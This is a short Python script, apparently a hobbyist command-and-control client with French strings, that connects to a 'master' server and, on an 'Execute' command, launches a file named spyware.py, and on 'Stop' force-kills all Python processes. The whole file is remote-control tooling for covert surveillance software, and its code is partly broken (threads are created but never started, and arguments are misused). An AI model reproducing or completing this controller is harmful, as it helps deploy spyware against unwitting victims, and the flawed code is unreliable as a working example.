import socket as modSocket
from threading import Thread
import time
import os 


machine_maitre = (("localhost", 5000))

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
s.connect(machine_maitre)
print("slave connecté au serveur")


def start_log(max):
        
    if s.recv(1024) == b"Execute":
        print("OK !!!")
        s.send("OK c'est fait !!!".encode("utf-8"))
        os.system("spyware.py")
        
    

def stop_log(max):
        
    if s.recv(1024) == b"Stop":
        print("OK !!!")
        os.system("taskkill /f /im python.exe")
    s.send("OK c'est fait !!!".encode("utf-8"))

start = Thread(target=start_log,args=(2,))
stop = Thread(target=stop_log,args=(2,))

start_log(s)
stop_log(s)
s.close()
